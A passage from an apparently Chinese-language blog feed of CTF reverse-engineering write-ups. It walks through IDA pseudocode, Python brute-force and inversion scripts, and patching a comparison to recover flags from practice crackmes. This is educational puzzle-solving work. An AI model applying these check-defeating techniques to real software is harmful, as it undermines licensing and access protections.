class="line">*value2=0</span><br></pre></td></tr></table></figure><p>作用为：<br><code>input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i])</code></p><p>不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">final=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]</span><br><span class="line">ar=&apos;&apos;</span><br><span class="line">for i in range(33):</span><br><span class="line">for s in string.printable:</span><br><span class="line">if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]:</span><br><span class="line">ar+=s</span><br><span class="line">print ar</span><br></pre></td></tr></table></figure><p>得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\aqc/M}</p><p>接下来根据ar的个数进行逆运算即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]</span><br><span class="line">final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\aqc/M&#125;&apos;)</span><br><span class="line">for i in range(len(operate)):</span><br><span class="line">final[i]=chr(operate[i]+ord(final[i]))</span><br><span class="line">flag=&apos;&apos;.join(final)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>得到flag第二位开始为<code>lag{D3v1L_H0mur4_f**k_y0uR_bra1N}</code></p><p>很明显第一位为f 手动添加上</p><p><strong><em>flag get</em></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-ccc</title>
      <link href="/2018/09/26/sus-ccc/"/>
      <url>/2018/09/26/sus-ccc/</url>
      
        <content type="html"><![CDATA[<p><a href="http://sus.njnet6.edu.cn/challenges#ccc" target="_blank" rel="noopener">题目地址</a></p><p>主函数很简单，直接看验证函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v6 = 0;</span><br><span class="line">if ( a2 != 42 )</span><br><span class="line">  return 0;</span><br><span class="line">for ( i = 3; i &lt;= 42; i += 3 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = crc32(0, (_BYTE *)a1, i);</span><br><span class="line">  v4 = v6++;</span><br><span class="line">  if ( v3 != hashes[v4] )</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>输入一共42位，1-3，1-6，1-9一直到1-42循环经过crc32函数处理后与hashes值进行比对，一共比对14次。crc32函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v6 = a2;</span><br><span class="line">  for ( i = ~a1; ; i = (i &gt;&gt; 8) ^ crc32_tab[(unsigned __int8)(i ^ *v3)] )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a3--;</span><br><span class="line">    if ( !v4 )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  return ~i;</span><br></pre></td></tr></table></figure><p>然而不管是写爆破脚本还是逆运算脚本都没能得到flag……觉得自己对函数的理解没有错误，百度了一下python中~0=-1,c语言中~0=1，所以出了问题。看了大佬的writeup发现python里可以使用crc32函数，于是爆破脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line">hashes=[0xD641596F,0x80A3E990,0xC98D5C9B,0xD05AFAF,0x1372A12D,0x5D5F117B,0x4001FBFD,0xA7D2D56B,0x7D04FB7E,0x2E42895E,0x61C97EB3,0x84AB43C3,0x9FC129DD,0xF4592F4D]</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for n in hashes:</span><br><span class="line">for i in string.printable:</span><br><span class="line">for j in string.printable:</span><br><span class="line">for k in string.printable:</span><br><span class="line">temp=i+j+k</span><br><span class="line">if binascii.crc32(flag+temp)&amp;0xffffffff == n:</span><br><span class="line">flag+=temp</span><br><span class="line">break;</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-accumulator</title>
      <link href="/2018/09/24/sus-accumulator/"/>
      <url>/2018/09/24/sus-accumulator/</url>
      
        <content type="html"><![CDATA[<p><a href="http://sus.njnet6.edu.cn/challenges#accumulator" target="_blank" rel="noopener">题目地址</a></p><p>拖进ida 主函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 v3; // rbx</span><br><span class="line">  char v4; // al</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  __int64 v6; // [rsp+0h] [rbp-458h]</span><br><span class="line">  char v7; // [rsp+3Fh] [rbp-419h]</span><br><span class="line">  char input; // [rsp+40h] [rbp-418h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+448h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, &quot;What&apos;s your flag? &quot;, a3);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = _IO_getc(stdin);</span><br><span class="line">    if ( v4 == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v4 == -1 )</span><br><span class="line">      break;</span><br><span class="line">    *(&amp;v7 + ++v3) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v3 != 1024 );</span><br><span class="line">  if ( SHA512((__int64)&amp;input, v3, (__int64)&amp;v6) )// v6=sha512(input)</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4008C0((unsigned __int8 *)&amp;v6, 64LL);</span><br><span class="line">    sub_4008C0((unsigned __int8 *)&amp;input, v3);</span><br><span class="line">    puts(&quot;Good flag for you.&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;error&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>do~while循环里是读取输入，最多读取1024位，遇到回车符或读取完则停止，很明显if条件必成立，v6=sha512(input)，进入sub4008c0函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = i + *a1;                               // i,j初始为0</span><br><span class="line">    v3 = v2 == dword_601080[j];</span><br><span class="line">    v4 = (unsigned int)(j + 1);</span><br><span class="line">    i += *a1;</span><br><span class="line">    ++j;</span><br><span class="line">    if ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      puts(&quot;Bad flag :(&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = a1 + 1;</span><br><span class="line">    v6 = &amp;a1[a2];</span><br><span class="line">    while ( v5 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *v5++;</span><br><span class="line">      v2 += v7;</span><br><span class="line">      v3 = v2 == dword_601080[v4];</span><br><span class="line">      i = v2;</span><br><span class="line">      j = v4 + 1;</span><br><span class="line">      if ( !v3 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">      v4 = (unsigned int)(v4 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一开始没分析出i和j的作用…对应的地址内存值为????一脸懵逼以为是没看见赋值，后知道了i和j是下标的作用，很容易分析出dword601080处的值就是input累加的结果，也就是说flag和dword601080内存值的位数是相等的，直接根据第二次sub4008c0就可以逆运算出flag，不需要管if条件对v6的操作以及第一次此函数对v6值的校验。然而照这样手动逆运算了前几个值，并没有得到类似于flag开头之类的字符，以为是分析错了，又看了好几遍函数，结果只是flag并不是从头开始……前几位是无意义的字符而已，</p><p>首次使用了idc脚本dump下了dword601080处内存，逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=[195,255,493,584,799,929,946,1086,1180,1184,1421,1595,1805,1846,2081,2320,2430,2605,2727,2972,3213,3403,3418,3649,3712,3950,3989,4193,4228,4394,4523,4624,4706,4935,4999,5072,5106,5291,5510,5536,5644,5751,5993,6118,6126,6198,6211,6410,6469,6609,6647,6752,6978,7010,7053,7106,7274,7468,7563,7673,7706,7956,8146,8187,8257,8333,8398,8469,8592,8640,8693,8742,8793,8844,8901,8953,9007,9062,9113,9161,9215,9317,9374,9429,9483,9540,9591,9644,9692,9741,9792,9846,9944,9996,10045,10144,10195,10246,10294,10350,10402,10450,10551,10652,10750,10849,10946,11045,11096,11147,11202,11304,11353,11451,11507,11605,11653,11753,11852,11900,11951,12052,12105,12161,12259,12360,12409,12461,12563,12664,12718,12775,12823,12921,12970,13020,13071,13173,13227,13276,13374,13422,13521,13569,13667,13718,13771,13873,13972,14029,14080,14179,14278,14377,14432,14482,14531,14579,14627,14679,14732,14789,14840,14894,14951,15052,15154,15210,15263,15314,15363,15460,15509,15610,15666,15763,15818,15916,15968,16018,16075,16132,16233,16288,16386,16443,16543,16600,16655,16703,16801,16858,16955,17005,17056,17153,17250,17375]</span><br><span class="line">b=[195]</span><br><span class="line">for i in range(1,len(a)):</span><br><span class="line">b.append(a[i]-a[i-1])</span><br><span class="line">s=&apos;&apos;.join([chr(i)for i in b])</span><br><span class="line">print s</span><br></pre></td></tr></table></figure><p>忽略掉前几个无意义字符后出现flag{}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sH1rkEr:desktop macbook$ python 1.py</span><br><span class="line">?;?&amp;i? +5??_n!??)FLAG&#123;051339467306f9769350136b41c330840eebcac337f1b8b0dc03e58be14fe690b123f61b0c0b35fc93ccc72100459369ef8531a1e8a7b4299e7b9d970b9a23aa&#125;</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-pyyy</title>
      <link href="/2018/09/24/sus-pyyy/"/>
      <url>/2018/09/24/sus-pyyy/</url>
      
        <content type="html"><![CDATA[<p><a href="http://sus.njnet6.edu.cn/challenges#pyyy" target="_blank" rel="noopener">题目地址</a></p><p>下载下来是个pyc文件，直接反编译一波：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">__import__(&apos;sys&apos;).setrecursionlimit(1048576)</span><br><span class="line">data = &apos;Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI&apos;</span><br><span class="line">a = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907L</span><br><span class="line">b = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499L</span><br><span class="line">c = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619L</span><br><span class="line">d = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053L</span><br><span class="line">e = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707L</span><br><span class="line">F = (a,b,c,d,e)</span><br><span class="line">m = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011L</span><br><span class="line">g = 67051725181167609293818569777421162357707866659797065037224862389521658445401L</span><br><span class="line">z = []</span><br><span class="line">for i, f in enumerate(F):</span><br><span class="line">    n = pow(f, m, g)</span><br><span class="line">    this_is = &apos;Y-Combinator&apos;</span><br><span class="line">    l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: (1 if x &lt; 2 else f(x - 1) * x % n))(g % 27777)</span><br><span class="line">    c = raw_input(&apos;Channenge #%d:&apos; % i)</span><br><span class="line">    if int(c) != l:</span><br><span class="line">        print &apos;Wrong~&apos;</span><br><span class="line">        exit()</span><br><span class="line">    z.append(l)</span><br><span class="line"></span><br><span class="line">z.sort()</span><br><span class="line">gg = &apos;(flaSg\&apos;7 \\h#GiQwt~66\x0csxCN]4sT&#123;? Zx YCf6S&gt;|~`\x0c$/&#125;\&apos;\r:4DjJFvm]([sP%FMY&quot;@=YS;CQ7T#zx42#$S_j0\\Lu^N31=r\x0b\t\tjVhhb_KM$|6]\nl!:V\rx8P[0m ;ho_\rR(0/~9HgE8!ec*AsGd[e|2&amp;h!&#125;GLGt\&apos;=$\x0cbKFMnbez-q\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\x0b\\9Ohf]c&gt;Vj/&gt;rnWXgLP#&lt;+4$BG@,\&apos;n a_7C:-&#125;f(WO8Y\x0c2|(nTP!\&apos;\\&gt;^\&apos;&#125;-7+AwBV!w7KUq4Qpg\tf.&#125;Z7_!m+ypy=`3#\\=?9B4=?^&#125;&amp;\&apos;~ Z@OH8\n0=6\x0b\tv\nl!G\&apos;y4dQW5!~g~I*f&quot;rz1&#123;qQH&#123;G9\x0c\&apos;b\x0cp\x0bdu!2/\\@i4eG&quot;If0A&#123;-)N=6GMC&lt;U5/ds\rG&amp;z&gt;P1\nsq=5&gt;dFZUWtjv\tX~^?9?Irwx\\5A!32N\x0bcVkx!f)sVY Men\x0c\&apos;ujN&lt;&quot;LJ\x0c5R4&quot;\\\\XPVA\&apos;m$~tj)Br&#125;C&#125;&amp;kX2&lt;|\np3XtaHB.P\&apos;(E 4$dm!uDyC%u [&quot;x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?&#123;%e\x0b]wN_&#125;*Q:mh&gt;@]u\t&amp;6:Z*Fmr?U`cOHbAf7s@&amp;5~L ,\tQ18 -Hg q2nz%\x0ccUm=dz&amp;h1(ozoZ)mrA=`HKo\n\&apos;rXm&#125;Z-l3]WgN\\NW&lt;&#123;o=)[V(&#123;7&lt;N1.-A8S&quot;=;3sderb\tOZ$K\r0o/5\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3&lt;w-g\&apos;/j\&apos;\tM4|9l?i&amp;tm_\n57X0B2rOpuB@H@%L_\r)&amp;/q=LZa(%&#125;&quot;&quot;#if#Kq74xK?`jGFOn&quot;8&amp;^3Q-\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\rstOT40=?DyHor8j7O\\r/~ncJ5];cCT)c?OS0EM5m#V(-%&quot;Tu:!UsE],0Dp  s@HErS]J&#123;%oH54B&amp;(zE.(@5#2k\tJnNlnUEij\\.q/3HBpJNk*X(k5;DlqK\&apos;\&apos;fX\r&#125;EBk_7\x0b:&gt;8~\t+M@WJx.PO(&#123;/U&#125;1&#125;#TqjreG\nN&#123;\rX&gt;4EsJr0Pn\\Z\\aL/-U&lt;&lt;&#123;,Q;j\tF=7f\&apos;)+wH:p&#123;G=_.s\\t-\x0bI\x0c*y\t1P:Y|/2xE&lt;uo]~$&gt;5k]FW+&gt;fR&lt;QA&quot;(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\t;9-Tu\tq|mzzhV_okP\t,d\rQ`]5Gf\x0c#gXB\x0cAH|)NI|K=KW-&amp;p-&lt;b&quot;3e.rO\x0cuK=\x0c^\r+MuLxCJ`UKaD\x0bBH&amp;n+YVajZ(U7pwWtto3T10VLHwSJ\rK\t&#125;\&apos;F$l1:b2Bd\na=#t0iq&#125;#!&#123;1_)w$&#125;&lt;Dp(borC\&apos;\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl&#123;&amp;fLr*mgCD;92/nNsaxKy/;\nr]sPK=`+YP&gt;MmfB\n8O4/&quot;&#125;nE7r*=41f2\t37&gt;K\&apos;s$wpl;qS[`qzu\x0b\t\nuaU|b,C`4&amp; dRN~]7DnuTb2FhNHV!#Z2Hho\x0b[%.&#123;O\t$q0\x0ch_@?w@b8[I^&#123;JL|O8]i8&#123;p)A.w)14qK3JoyF%licZ~ga\rW[L:W\rtIvfWJjZUOvB\rS.Beav3!-@bw|PexJ Pcw1\ry6!63B&#125;]J])6fak/3r]W\tMeXt[uc(1_U lys&#123;a1X\r%)[wwP3rhgNW&#123;*d~_E%Q2htCt5ha@l0^0=\x0bwT\ni4/V;_\nM1rb?w~Q)Dli4u\n`&#125;1+D8&quot;\t`@V~$9l$Uy**VnI (@Ga0&lt;RxfmoNgJTtE-aLH\rE5fMy7rk$)V\rL2Fv/AivOa&quot;\nuX|70Xrw^D]%i%JyT\x0cc%cwZ/Wbp=IiY;/@nFEe&gt;3=tM;K*`fReGoc5V/Ri?nXZ-RW)\&apos;\t&lt;\x0cV&gt;@X@-Ei4%sO%&#125;,B_pjc`s&quot;@oKCmdgDhjUZT@?mb\&apos;?Q:F\x0bLJkPgjaFAc=rbrjAz$Zz\x0cq0GU!&quot;)xFOEF(x!3M\t:l83|&#125;&#125;HgGJJ#eT/I\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\&apos;S|tb&gt;RX` ca*CO&lt;w\x0ci =wc1,M~\x0bc`FYEs\r)&#123;+Ll8[I9-88m\t\\iK/\\hno-C[vX*3Hx:%:K\rt\x0cW!tj\&apos;SOhqxP|k7cw Hm?I@?P\&apos;HmapG7$0#T(Auz]sjmd#\rFP/&#125;53@-Kvmi(d%dZKLZ2LK\&apos;e_E\x0bQmR 5/(irq4-EUyp&lt;hB?[\tnU:p*xuzASM&apos;</span><br><span class="line">print &apos;&apos;.join((gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: (1 if n &lt; 3 else f(n - 1) + f(n - 2)))(i + 2)] for i in range(16))) % &apos;&apos;.join((data[pow((__import__(&apos;fractions&apos;).gcd(z[i % 5], z[(i + 1) % 5]) * 2 + 1) * g, F[i % 5] * (i * 2 + 1), len(data))] for i in range(32)))</span><br></pre></td></tr></table></figure><p>先运行一波：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sH1rkEr:desktop macbook$ python 1.py</span><br><span class="line">Channenge #0:111</span><br><span class="line">Wrong~</span><br></pre></td></tr></table></figure><p>观察到print ‘Wrong~’ 上面的if int(c) != l 可能就是判断条件，把!=改成==尝试一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sH1rkEr:desktop macbook$ python 1.py</span><br><span class="line">Channenge #0:1</span><br><span class="line">Channenge #1:1</span><br><span class="line">Channenge #2:122313</span><br><span class="line">Channenge #3:123</span><br><span class="line">Channenge #4:13</span><br><span class="line">flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125;</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p><p>话说只能做做这种简单的题目了QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-helloworld</title>
      <link href="/2018/09/23/sus-helloworld/"/>
      <url>/2018/09/23/sus-helloworld/</url>
      
        <content type="html"><![CDATA[<p><a href="http://sus.njnet6.edu.cn/challenges#Helloworld" target="_blank" rel="noopener">题目地址</a></p><p>ida启动 main函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)flag = 0xC881E8F1;</span><br><span class="line">*(_DWORD *)&amp;flag[4] = 0xCECF81D2;</span><br><span class="line">*(_DWORD *)&amp;flag[8] = 0x81C081D5;</span><br><span class="line">*(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;</span><br><span class="line">*(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;</span><br><span class="line">*(_DWORD *)&amp;flag[20] = 0xCCD4CF81;</span><br><span class="line">*(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;</span><br><span class="line">flag[28] = 0;</span><br><span class="line">printf(&quot;What is magic number? &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">if ( n == 0x12B9B0A1 )</span><br><span class="line">&#123;</span><br><span class="line">  for ( i = 0; flag[i]; ++i )</span><br><span class="line">    flag[i] ^= n;</span><br><span class="line">  printf(&quot;Flag is FLAG&#123;%s&#125;\n&quot;, flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Try Hard.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>如果输入的n为0x12b9b0a1，flag[i]^=n</p><p>通过汇编命令可以发现此处n取一个byte，也就是0xa1</p><p>逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag=[0xf1,0xe8,0x81,0xc8,</span><br><span class="line">0xd2,0x81,0xcf,0xce,</span><br><span class="line">0xd5,0x81,0xc0,0x81,</span><br><span class="line">0xd3,0xc0,0xd5,0xc8,</span><br><span class="line">0xce,0xcf,0xc0,0xcd,</span><br><span class="line">0x81,0xcf,0xd4,0xcc,</span><br><span class="line">0xc3,0xc4,0xd3,0x8f]</span><br><span class="line">s=&apos;&apos;</span><br><span class="line">for i in flag:</span><br><span class="line">i^=0xa1</span><br><span class="line">s+=chr(i)</span><br><span class="line">print s</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p><p>因为不会啥操作，所以flag list只能手打了……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sus-bitx</title>
      <link href="/2018/09/22/bitx/"/>
      <url>/2018/09/22/bitx/</url>
      
